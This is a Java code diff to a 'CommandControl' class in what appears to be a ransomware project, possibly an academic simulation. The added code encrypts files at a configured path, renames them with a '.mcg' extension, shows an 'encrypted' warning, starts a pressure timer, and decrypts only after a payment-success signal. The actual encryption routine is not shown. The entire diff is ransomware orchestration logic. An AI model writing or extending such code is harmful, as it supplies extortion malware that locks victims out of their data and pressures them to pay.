@@ -8,15 +8,18 @@ import console.Subscriber;
 import console.TextColor;
 import events.AttackEvent;
 import person.*;
+import pressurize.Pressurize;
 
 public class CommandControl extends Subscriber implements IConsoleUser {
     private final RansomwareReflector reflector;
     private final Console console;
-    public CommandControl(Integer id, Console console){
+    private final Pressurize pressurize;
+    public CommandControl(Integer id, Console console, Pressurize pressurize){
         super(id);
         this.reflector = new RansomwareReflector();
         this.reflector.setPath(Configuration.instance.pathToAttack);
         this.console = console;
+        this.pressurize = pressurize;
     }
 
     @Subscribe
@@ -24,10 +27,15 @@ public class CommandControl extends Subscriber implements IConsoleUser {
         switch (event.getTask()){
             case CL_LAUNCH -> {
                 this.reflector.encrypt();
+                this.reflector.rename(".mcg", true);
+                this.writeToConsole(ConsoleCorrespondation.M_ENCRYPTED, TextColor.RED);
+                pressurize.invokeTimer();
             }
             case CL_CHECKPAYMENT -> {
-                if(event.getTask().getClass().equals(ConsoleCorrespondation.M_TRANSACTIONSUCCESS.getClass())){
+                if(event.getTask() == ConsoleCorrespondation.M_TRANSACTIONSUCCESS){
                     this.reflector.decrypt();
+                    this.reflector.rename(".mcg", false);
+                    this.pressurize.setPaid(true);
                 }
             }
         }
